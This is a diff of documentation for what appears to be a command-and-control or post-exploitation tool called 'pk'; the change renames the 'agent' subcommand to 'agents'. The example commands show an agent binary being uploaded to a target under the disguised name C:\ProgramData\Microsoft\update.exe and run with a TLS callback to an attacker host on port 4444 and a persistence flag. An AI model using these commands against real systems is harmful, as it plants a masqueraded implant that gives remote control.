@@ -233,13 +233,13 @@ pk tunnel status                       # list active tunnels
 pk tunnel down <session>               # stop tunnel
 
 # Agent binaries (pre-compiled, ready for deployment)
-pk agent list                          # list available agent binaries
-pk agent path <target>                 # path to binary (e.g. linux-amd64-tls)
+pk agents list                          # list available agent binaries
+pk agents path <target>                 # path to binary (e.g. linux-amd64-tls)
 ```
 
 Deploy an agent to a target:
 ```bash
-pk upload mysession $(pk agent path windows-amd64-tls) C:\ProgramData\Microsoft\update.exe
+pk upload mysession $(pk agents path windows-amd64-tls) C:\ProgramData\Microsoft\update.exe
 pk shell exec mysession "C:\ProgramData\Microsoft\update.exe -H <lhost> -p 4444 --tls --cron"
 ```
 
